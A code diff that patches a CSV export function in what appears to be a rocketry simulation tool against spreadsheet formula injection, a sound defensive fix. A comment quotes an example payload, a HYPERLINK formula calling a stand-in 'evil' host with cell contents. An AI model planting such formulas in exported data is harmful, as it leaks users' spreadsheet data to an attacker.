@@ -237,8 +237,21 @@ export function flightEventsCsv(
   // Names come from the design and from a translation, so they can hold a comma
   // or a newline; neither may split the row. Quoting rather than stripping,
   // because unlike a column header these are the user's own words.
-  const text = (v: string | undefined): string =>
-    v == null || v === '' ? '' : `"${v.replace(/[\r\n]+/g, ' ').replace(/"/g, '""')}"`;
+  // Quoting alone does NOT stop spreadsheet formula injection: Excel and Sheets
+  // strip the quoting before evaluating, so a recovery device named
+  // `=HYPERLINK("http://evil/?"&A1,"Open")` in a shared .ork executes when the
+  // exported events CSV is opened. Prefix a `'` on a leading trigger, as
+  // reportCsv's `cell` does.
+  //
+  // Strict on a leading `-`, unlike flightPathExport's escaper: every value
+  // here is a NAME, so there is no negative number to keep numeric, and
+  // `-1+HYPERLINK(...)` does evaluate.
+  const text = (v: string | undefined): string => {
+    if (v == null || v === '') return '';
+    const flat = v.replace(/[\r\n]+/g, ' ');
+    const safe = /^[=+\-@\t]/.test(flat) ? `'${flat}` : flat;
+    return `"${safe.replace(/"/g, '""')}"`;
+  };
 
   const lines: string[] = [];
   if (name) lines.push(`# Simulation: ${name.replace(/[\r\n]+/g, ' ')}`);
